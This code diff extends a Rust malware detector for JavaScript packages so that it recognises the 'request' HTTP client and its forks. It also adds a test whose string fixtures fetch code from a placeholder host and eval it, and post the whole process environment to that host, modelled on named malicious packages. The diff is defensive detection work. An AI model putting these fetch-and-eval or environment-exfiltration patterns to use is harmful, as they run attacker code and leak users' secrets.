@@ -460,6 +460,9 @@ const FETCH_MODULES: &[&str] = &[
     "node-fetch-native", "ofetch",
 ];
 const POSTERS: &[&str] = &["axios", "got", "needle", "superagent", "ky"];
+/// The `request` client and its forks: `request(options, callback)` and
+/// `request.get(url, callback)`, the callback given the response's body.
+const REQUEST_CLIENTS: &[&str] = &["request", "@cypress/request", "postman-request"];
 const CONN_WRITES: &[&str] = &["write", "end", "send", "sendall", "sendto", "request"];
 const CONN_CHAIN: &[&str] =
     &["on", "once", "addListener", "prependListener", "setHeader", "setTimeout", "setNoDelay", "setKeepAlive", "setEncoding"];
@@ -542,6 +545,16 @@ fn send_spec(names: &[PyStr]) -> Option<Spec> {
         if is_one(n, &["http.get", "http.request", "https.get", "https.request", "axios.get", "got", "got.get"]) {
             return Some(ADDRESS);
         }
+        // (request: the options hold the address and what is sent: form,
+        // formData, body, json; a GET's data is only its address)
+        for m in REQUEST_CLIENTS {
+            if eq(n, m) || dotted2(m, &["post", "put", "patch"])(n) {
+                return Some(OPTIONS);
+            }
+            if dotted2(m, &["get", "head", "del", "delete"])(n) {
+                return Some(ADDRESS);
+            }
+        }
         if eq(n, "dns.lookup") || eq(n, "dns.promises.lookup") {
             return Some(LOOKUP);
         }
@@ -592,6 +605,7 @@ const SERVER_DATA_EVENTS: &[&str] = &[
 fn makes_client(names: &[PyStr]) -> bool {
     names.iter().any(|n| {
         is_one(n, &["axios.create", "got.extend", "got.create", "ky.create", "ky.extend"])
+            || REQUEST_CLIENTS.iter().any(|m| dotted2(m, &["defaults"])(n))
     })
 }
 
@@ -620,7 +634,7 @@ fn receives(names: &[PyStr]) -> bool {
         ) {
             return true;
         }
-        POSTERS.iter().any(|m| eq(n, m) || CLIENT_CALLS.iter().any(|c| eq(n, &format!("{}.{}", m, c))))
+        POSTERS.iter().chain(REQUEST_CLIENTS).any(|m| eq(n, m) || CLIENT_CALLS.iter().chain(&["del"]).any(|c| eq(n, &format!("{}.{}", m, c))))
     })
 }
 
@@ -743,14 +757,15 @@ impl<'p> Eval<'p> {
     fn sc_names(&mut self, callee: NodeId, scope: ScopeId) -> Vec<PyStr> {
         let m = self.m;
         let mut out: Vec<PyStr> = Vec::new();
-        let (member, obj, prop) = {
+        let (member, obj) = {
             let a = self.a();
             if a.kind(callee) == Kind::MemberExpression {
-                (true, a.at(callee, jt::A), a.prop_name(callee))
+                (true, a.at(callee, jt::A))
             } else {
-                (false, NONE, None)
+                (false, NONE)
             }
         };
+        let prop = if member { self.p.member_name(m, callee, scope) } else { None };
         if member {
             if let Some(prop) = &prop {
                 // a global's own member: self.fetch, global.fetch
@@ -1293,8 +1308,15 @@ impl<'p> Eval<'p> {
                 if module != self.m {
                     return false;
                 }
-                if writes.iter().any(|w| matches!(w, Write::Param { .. })) {
-                    return true;
+                // (a parameter; one whose default is text the script writes is the
+                // script's own when its caller gives nothing: `function get(o = OPTIONS)`,
+                // a dropper's exported function called with no arguments)
+                for w in writes.iter() {
+                    if let Write::Param { node: p, scope: s, .. } = w {
+                        if !self.sc_own_default(*p, *s, depth) {
+                            return true;
+                        }
+                    }
                 }
                 // (a name given what comes from the caller; a loop's variable, an
                 // item or a key of what it walks)
@@ -1341,6 +1363,19 @@ impl<'p> Eval<'p> {
             _ => return false,
         };
         parts.into_iter().any(|p| !self.a().is_function(p) && self.sc_from_caller(p, scope, depth + 1))
+    }
+
+    /// A parameter `p` (its node in the function's list) with a default the
+    /// script writes itself, one no caller gives: `o = OPTIONS`, not `o = a`.
+    fn sc_own_default(&mut self, p: NodeId, scope: ScopeId, depth: u32) -> bool {
+        let (left, right) = {
+            let a = self.a();
+            if a.kind(p) != Kind::AssignmentPattern {
+                return false;
+            }
+            (a.at(p, jt::A), a.at(p, jt::B))
+        };
+        self.a().is_ident(left) && !self.sc_from_caller(right, scope, depth + 1) && self.sc_constant_text(right, scope, depth + 1)
     }
 
     /// Is the value at `node` built from text the script writes: a string or
@@ -1405,6 +1440,11 @@ impl<'p> Eval<'p> {
                 return writes.iter().take(8).any(|w| match w {
                     Write::Init { node: v, scope: s, .. } | Write::Assign { node: v, scope: s, .. } => {
                         self.sc_constant_text_in(*v, *s, depth + 1, value, seen)
+                    }
+                    // (a parameter's default: what it holds when no caller gives it)
+                    Write::Param { node: p, scope: s, .. } if self.a().kind(*p) == Kind::AssignmentPattern => {
+                        let (left, right) = (self.a().at(*p, jt::A), self.a().at(*p, jt::B));
+                        self.a().is_ident(left) && self.sc_constant_text_in(right, *s, depth + 1, value, seen)
                     }
                     // (a loop's variable: an item, or a key, of what it walks)
                     Write::Opaque { node: v, scope: s }
@@ -3597,6 +3637,48 @@ mod tests {
             post("out")
         );
         assert_eq!(sent(&src), found("environment", "the whole environment"));
+    }
+
+    #[test]
+    fn what_the_in_sample_misses_do() {
+        // the request client (react-svg-helper-fast, react-zutils): its calls
+        // receive, through their callback, and its forks' and defaults' too
+        let run = |call: &str| format!("const request = require('request');\n{}, (e, r, body) => {{ eval(body); }});\n", call);
+        for call in [
+            format!("request({{ url: 'https://{}/a' }}", HOST),
+            format!("request('https://{}/a'", HOST),
+            format!("request.get('https://{}/a'", HOST),
+            format!("request.post({{ url: 'https://{}/a', form: {{}} }}", HOST),
+            format!("request.defaults({{ timeout: 5 }})('https://{}/a'", HOST),
+        ] {
+            assert_eq!(runs(&run(&call)), Some("run"), "{}", call);
+        }
+        let fork = format!("const r = require('@cypress/request');\nr.get('https://{}/a', (e, x, b) => eval(b));\n", HOST);
+        assert_eq!(runs(&fork), Some("run"));
+        // what it sends: its options' form, formData, body, json
+        let send = format!(
+            "const request = require('request');\nrequest.post({{ url: 'https://{}/c', form: {{ env: JSON.stringify(process.env) }} }}, () => {{}});\n",
+            HOST
+        );
+        assert_eq!(sent(&send), found("environment", "the whole environment"));
+        // a member named by a constant, as decoding leaves an obfuscated call
+        let named = format!("const x = require('request'), N = ('post', 'get');\nx[N]('https://{}/a', (e, r, b) => {{ eval(b); }});\n", HOST);
+        assert_eq!(runs(&named), Some("run"));
+        let module = format!("const i = 'request';\nconst x = require(i);\nx.get('https://{}/a', (e, r, b) => eval(b));\n", HOST);
+        assert_eq!(runs(&module), Some("run"));
+        // a parameter whose default is the script's own address is that
+        // address when its caller gives none (react-svg-helper-fast's getPlugin);
+        // one with no default, or a default its caller gives, is the caller's
+        let default = format!(
+            "const request = require('request');\nconst options = {{ url: 'https://{}/icons/' }};\n\
+             function getPlugin(token = '101', opts = options) {{\n  opts.url = `${{opts.url}}${{token}}`;\n  request(opts, (e, r, b) => {{ eval(JSON.parse(b).credits); }});\n}}\nmodule.exports = {{ getPlugin }};\n",
+            HOST
+        );
+        assert_eq!(runs(&default), Some("run"));
+        let given = "const request = require('request');\nfunction load(opts) {\n  request(opts, (e, r, b) => { eval(b); });\n}\nmodule.exports = load;\n";
+        assert_eq!(runs(given), None);
+        let from_caller = "const request = require('request');\nfunction load(base, opts = { url: base }) {\n  request(opts, (e, r, b) => { eval(b); });\n}\nmodule.exports = load;\n";
+        assert_eq!(runs(from_caller), None);
     }
 
     #[test]
